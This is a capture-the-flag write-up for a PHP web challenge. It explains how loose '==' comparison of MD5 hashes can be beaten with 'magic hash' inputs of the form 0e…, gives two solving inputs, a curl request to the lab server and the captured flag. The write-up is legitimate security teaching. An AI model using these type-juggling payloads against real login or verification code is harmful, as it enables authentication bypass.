# Web CTF Final Unicorns

```php
if (!array_key_exists('val1', $_POST) || !array_key_exists('val2', $_POST)) {
    echo "Please send the inputs correctly\n";
    exit(0);
}

$first  = $_POST['val1'];
$second = $_POST['val2'];

if (!(is_numeric($first) || is_numeric($second))) {
    echo "Invalid input\n";
    exit(0);
}

$hash1 = hash('md5', $first,  false);
$hash2 = hash('md5', $second, false);

// First check: loose inequality
if ($hash1 != $hash2) {
    // Replace letters a–d → digits 0–3
    $hash1 = strtr($hash1, "abcd", "0123");
    $hash2 = strtr($hash2, "abcd", "0123");

    // Second check: loose equality
    if ($hash1 == $hash2) {
        echo $flag;  // FLAG!
    } else {
        echo "Hard luck :(\nKeep trying\n";
    }
} else {
    echo "Hard luck :(\nKeep trying\n";
}
```

- At least one of val1 or val2 must be numeric.
- Both inputs are MD5‑hashed (hex, lowercase).

Loose Comparison

- First: `if ($hash1 != $hash2)` uses PHP’s loose **!=**.
- Second: after mapping **a→0, b→1, c→2, d→3**, tests `if ($hash1 == $hash2)` with loose **==**.

The “Magic Hash” Trick
In PHP, when you compare two strings using `==/!=`, if they look like valid decimal floats (including scientific notation), PHP casts them to floats before comparing. Specifically, any string of the form: **0e<digits>**

is interpreted as `0 × 10^<digits>` → the numeric value 0.

Example MD5 collisions of the form 0e…

```
md5("240610708") == "0e462097431906509019562988736854"
md5("QNKCDZO")   == "0e830400451993494058024219903391"
```

Both are distinct hex‐strings, yet each begins with “0e” followed by only digits.

## Solution

### Input #1: 240610708

```text
md5("240610708")  
  = 0e462097431906509019562988736854
```

Already a “0e…” string → numeric‐string.


### Input #2: 871

```text
md5("871")  
  = aeb3135b436aa55373822c010763dd54
```
  
Not numeric → first comparison sees them as different strings ("0e…" != "ae…" → TRUE).

After `strtr("abcd"→"0123")`:

```text
aeb3135b436aa55373822c010763dd54
  → 0e131351436005537382220107633354
```

which is again of the form “0e…” (all digits after “e”), so the loose second comparison casts both to 0 → equal.

```bash
curl -s -X POST http://ctf-13.security.cs.pub.ro:8000/ \
     -d 'val1=240610708&val2=871'
```
     
Observe the output: **SSS{un1c0rns_3at_m4g1c_h4sh3s}**
